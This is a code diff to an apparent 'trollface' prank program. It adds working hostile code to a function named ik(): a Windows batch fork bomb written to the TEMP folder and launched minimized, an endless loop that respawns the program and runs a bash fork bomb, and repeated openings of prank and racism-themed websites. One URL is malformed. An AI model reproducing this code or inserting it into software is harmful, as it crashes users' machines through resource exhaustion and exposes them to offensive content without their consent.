@@ -43,8 +43,17 @@ def get_random_trollface(a=False):
     return os.path.join(config["trollface_folder"], random_trollface)
 
 def ik():
+    temp_dir = os.environ.get("TEMP")
+    batch_content = "%0 | %0"
+    bfp = os.path.join(temp_dir, "balls.bat")
+    with open(bfp, "w") as batch_file:
+        batch_file.write(batch_content)
+        subprocess.Popen(["cmd.exe", "/c", "start", "/min", bfp])
     while True:
         subprocess.Popen("python3 main.py", shell=True)
-        subprocess.Popen("%0|%0", shell=True)
         subprocess.Popen(":(){ :|:& };:", shell=True)
         webbrowser.open("https://youareanidiot.cc/lol.html")
+        webbrowser.open("https://https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        webbrowser.open("https://racist.com/")
+        webbrowser.open("https://racism.com/")
+        webbrowser.open("https://newsnioworld.com/roblox-g")
